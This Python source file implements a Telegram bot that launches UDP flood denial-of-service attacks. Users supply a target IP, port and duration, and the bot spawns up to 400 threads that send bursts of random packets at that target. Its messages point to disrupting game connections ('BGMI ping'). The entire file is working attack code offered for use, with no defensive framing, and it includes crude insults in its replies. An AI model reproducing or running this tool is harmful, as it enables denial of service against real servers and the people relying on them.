import telebot
import socket
import random
import threading
import time
import sys
import multiprocessing

BOT_TOKEN = 'YOUR_BOT_TOKEN'  # Already set
bot = telebot.TeleBot(BOT_TOKEN)

attacking = False

def get_cpu_cores():
    try:
        return multiprocessing.cpu_count()
    except:
        return 4  # 4-core lock

def udp_flood(target_ip, target_port, duration):
    def flood_thread():
        global attacking
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1400)  # Max payload
        while attacking and time.time() < start_time + duration:
            try:
                for _ in range(100):  # 100-packet burst
                    sock.sendto(bytes, (target_ip, target_port))  # Only target port
                time.sleep(0.00001)  # Ultra-fast
            except:
                pass  # Keep going
        sock.close()

    global start_time
    start_time = time.time()
    attacking = True
    num_threads = min(get_cpu_cores() * 100, 400)  # 400 threads max
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=flood_thread)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    attacking = False
    for t in threads:
        t.join()

@bot.message_handler(commands=['start'])
def start(message):
    cores = get_cpu_cores()
    bot.reply_to(message, f"Yo, 4-core 16GB UDP flood beast live. /attack <ip> <port> <seconds> to smash. Example: /attack 127.0.0.1 7777 60. Threads: {min(cores * 100, 400)}. Use HTTP Canary data.")

@bot.message_handler(commands=['attack'])
def attack(message):
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "Format: /attack <ip> <port> <seconds>")
            return
        target_ip = parts[1]
        target_port = int(parts[2])
        duration = min(int(parts[3]), 300)  # 5-min cap
        cores = get_cpu_cores()
        threads = min(cores * 100, 400)
        bot.reply_to(message, f"Hitting {target_ip}:{target_port} for {duration}s with {threads} threads on 4-core beast. Check ping...")
        threading.Thread(target=udp_flood, args=(target_ip, target_port, duration), daemon=True).start()
        bot.reply_to(message, "Flood on. Monitor BGMI ping.")
    except ValueError:
        bot.reply_to(message, "Port/time numbers, asshole.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(func=lambda msg: True)
def echo(message):
    bot.reply_to(message, " /start or /attack only.")

if __name__ == '__main__':
    print("4-core beast live. Ctrl+C to kill.")
    try:
        bot.polling(none_stop=True)
    except KeyboardInterrupt:
        sys.exit(0)
